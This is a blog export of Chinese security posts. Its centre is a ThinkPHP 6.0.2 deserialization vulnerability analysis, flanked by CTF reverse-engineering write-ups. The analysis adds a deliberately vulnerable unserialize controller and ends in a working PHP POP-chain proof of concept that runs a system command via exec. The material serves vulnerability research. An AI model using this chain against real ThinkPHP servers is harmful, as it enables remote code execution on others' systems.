jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 19</span></span><br><span class="line"><span class="comment"># You win! flag is </span></span><br><span class="line"><span class="comment"># flag&#123;Ch4rp_W1th_R$@&#125;</span></span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/181019">SCTF2019 Writeup——De1ta</a></p>
]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.0反序列漏洞分析</title>
    <url>/2020/07/28/ThinkPHP6-0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>thinkphp 6.0.2</li>
<li>PHP 7.4.7</li>
</ul>
<span id="more"></span>

<p>修改index页面如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>全局搜索<code>__destruct</code>，找到Model模块的，满足<code>$this-&gt;lazySave == true</code>条件，进入代码[1]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(); <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;save()</code>，满足<code>$this-&gt;isEmpty() == false &amp;&amp; $this-&gt;trigger(&#39;BeforeWrite&#39;) == true &amp;&amp; $this-&gt;exists == true</code>条件，其中<code>isEmpty</code>判断的是<code>data</code>是否为空，<code>trigger</code>函数满足<code>$this-&gt;withEvent == false</code>即可，接着可以进入代码[2]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>); <span class="comment">// 2</span></span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/ModelEvent.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;updateData()</code>，满足<code>$this-&gt;trigger(&#39;BeforeWrite&#39;) == true</code>条件，进入代码[3]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 事件回调</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">        <span class="comment">// 自动写入更新时间</span></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoWriteTimestamp</span>(<span class="variable language_">$this</span>-&gt;updateTime);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;updateTime] = <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime];</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>(); <span class="comment">// 4</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;getChangedData()</code>，这里应该使<code>$this-&gt;force == true</code>，直接返回$data，否则会返回其他干扰值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable language_">$this</span>-&gt;data, <span class="variable language_">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到上一步，满足<code>empty($data) == false</code>条件进入代码[4]，跟进<code>$this-&gt;checkAllowFields()</code>，满足<code>empty($this-&gt;field) == true &amp;&amp; empty($this-&gt;schema) == true</code>条件，进入代码[5]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;field = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable language_">$this</span>-&gt;schema, <span class="variable language_">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>(); <span class="comment">// 5</span></span><br><span class="line">            <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;table ? <span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix : <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getTable</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;field = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getConnection</span>()-&gt;<span class="title function_ invoke__">getTableFields</span>(<span class="variable">$table</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;db()</code>，代码[6]处参数可控，可以触发<code>__toString()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable language_">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">name</span>(<span class="variable language_">$this</span>-&gt;name . <span class="variable language_">$this</span>-&gt;suffix) <span class="comment">// 6</span></span><br><span class="line">        -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable language_">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>后面POP链与ThinkPHP5.1相同</p>
</blockquote>
<p>首先触发Conversion类中的<code>__toString()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Conversion.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>); <span class="comment">// 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>(); <span class="comment">// 7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到<code>$this-&gt;toArray()</code>，最后我们的目标是调用<code>getAttr()</code>函数，但是代码[9]处的条件会被前面的代码修改，不可控，所以我们只能利用代码[10]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Conversion.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    [<span class="variable">$relation</span>, <span class="variable">$name</span>]          = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>); <span class="comment">// 9</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>); <span class="comment">// 10</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;getAttr($key)</code>，我们可以在代码[11]插入任意命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>); <span class="comment">// 11</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>); <span class="comment">// 13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>$this-&gt;getData($name)</code>，代码[12]那里我们要返回存储在<code>data</code>的命令参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable language_">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>]; <span class="comment">// 12</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable language_">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回上一步继续跟进<code>$this-&gt;getValue($name, $value, $relation)</code>，在这里把代码[14]把存储在<code>withAttr</code>的命令参数赋值给<code>closure</code>，代码[15]即可进行RCE</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vendor/topthink/think-orm/src/model/concern/Attribute.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$relation</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable language_">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>]; <span class="comment">// 14</span></span><br><span class="line">            <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data); <span class="comment">// 15</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$connection</span> = <span class="string">&quot;mysql&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;Tyaoo&quot;</span>=&gt;<span class="string">&quot;exec&quot;</span>]; <span class="comment">// 系统命令</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;Tyaoo&quot;</span>=&gt;<span class="string">&quot;calc&quot;</span>]; <span class="comment">// 命令参数</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>()));</span><br></pre></td></tr></table></figure>



<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200727230224.png" alt="image-20200727230214642" style="zoom:67%;" />



<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP6.0.2反序列化链分析/</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>babyvm-vm逆向</title>
    <url>/2021/03/28/babyvm-vm%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<blockquote>
<p>题目源于【GWCTF 2019】，考点为vm逆向</p>
</blockquote>
<p>记录一道比较典型的vm题</p>
<span id="more"></span>

<h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a><strong>主函数</strong></h4><p>程序主函数如下，下面我们对调用到的3个函数进行分析</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032802545d24aa8308413d2dccd8.png" alt="image-20210327233354971"></p>
<h4 id="vm自定义方法"><a href="#vm自定义方法" class="headerlink" title="vm自定义方法"></a><strong>vm自定义方法</strong></h4><p><code>sub_55BE054DCCD1()</code>函数用于存储需要调用到的方法，也可以观察到每调用完一次操作，a1就会自增跳到下一个命令，类似RIP功能</p>
